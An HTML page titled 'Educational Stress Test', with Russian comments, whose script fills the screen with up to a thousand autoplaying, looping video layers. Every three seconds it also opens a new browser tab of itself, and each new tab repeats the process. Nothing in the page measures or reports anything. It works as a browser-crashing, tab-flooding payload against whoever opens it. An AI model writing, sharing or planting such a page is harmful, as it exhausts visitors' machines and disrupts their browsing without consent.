<!DOCTYPE html>
<html>
<head>
    <title>Educational Stress Test</title>
    <style>
        body { overflow: hidden; margin: 0; }
        .video-layer {
            position: absolute;
            width: 20vw;
            height: 20vh;
            opacity: 0.7;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <script>
        // Параметры нагрузки
        const MAX_LAYERS = 1000; // Максимум видео-слоёв
        const SPAWN_DELAY = 500; // Мс между созданиями
        const VIDEO_SRC = "ambatublow.mp4"; // Замените на реальную ссылку
        
        // Рекурсивное создание видео-слоёв
        let layerCount = 0;
        const createVideoLayer = () => {
            if (layerCount >= MAX_LAYERS) return;
            
            const layer = document.createElement('div');
            layer.className = 'video-layer';
            layer.style.left = Math.random() * 100 + 'vw';
            layer.style.top = Math.random() * 100 + 'vh';
            
            const video = document.createElement('video');
            video.src = VIDEO_SRC + '?cachebust=' + Date.now();
            video.autoplay = true;
            video.loop = true;
            video.muted = true;
            video.playsInline = true;
            video.style.width = '100%';
            video.style.height = '100%';
            
            layer.appendChild(video);
            document.body.appendChild(layer);
            
            layerCount++;
            setTimeout(createVideoLayer, SPAWN_DELAY);
        };

        // Запуск процесса
        createVideoLayer();
        
        // Дополнительная нагрузка
        setInterval(() => {
            window.open(window.location.href + '?tab=' + Date.now(), '_blank');
        }, 3000);
    </script>
</body>
</html>
